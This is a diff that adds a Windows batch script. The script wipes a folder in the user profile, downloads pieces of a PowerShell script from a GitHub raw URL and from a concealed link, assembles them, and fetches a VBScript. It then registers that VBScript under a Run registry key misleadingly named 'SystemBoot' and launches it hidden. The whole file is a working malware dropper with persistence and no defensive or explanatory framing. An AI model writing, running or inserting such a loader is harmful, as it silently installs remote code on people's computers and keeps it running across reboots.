@@ -1,0 +1,33 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+set "d=%userprofile%\NewProfile"
+set "f=%d%\META.txt"
+set "a=%d%\1.txt"
+set "b=%d%\2.txt"
+set "c=%d%\NNV.ps1"
+set "v=%d%\S_M.vbs"
+set "u=raw.githubusercontent.com/chotaacc/newss/main"
+set "tynLink=****"
+
+if not exist "%d%" mkdir "%d%"
+
+rem Delete everything except this script
+for /f "delims=" %%F in ('dir "%d%" /a /b') do (
+  if /I not "%%~nxF"=="%~nx0" (
+    rmdir /s /q "%d%\%%F" 2>nul
+    del /f /q "%d%\%%F" 2>nul
+  )
+)
+
+powershell -c "$contentM=(Invoke-WebRequest -Uri 'https://%u%/final.txt' -UseBasicParsing).Content; $contentA=(Invoke-WebRequest -Uri 'https://%u%/first.txt' -UseBasicParsing).Content; $contentB=(Invoke-WebRequest -Uri '%tynLink%' -UseBasicParsing).Content; $final=$contentM -replace '----',$contentA -replace '====',$contentB; [IO.File]::WriteAllText('%c%',$final)" 
+if errorlevel 1 echo PowerShell step 1 failed & pause & exit /b
+
+powershell -c "$content=(Invoke-WebRequest -Uri 'https://%u%/S_m.vbs' -UseBasicParsing).Content; [IO.File]::WriteAllText('%v%',$content)" 
+if not exist "%v%" echo S_m.vbs not downloaded & pause & exit /b
+
+powershell -c "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SystemBoot' -Value 'wscript.exe \"%v%\"'"
+start /min wscript "%v%"
+
+endlocal
+exit /b 0
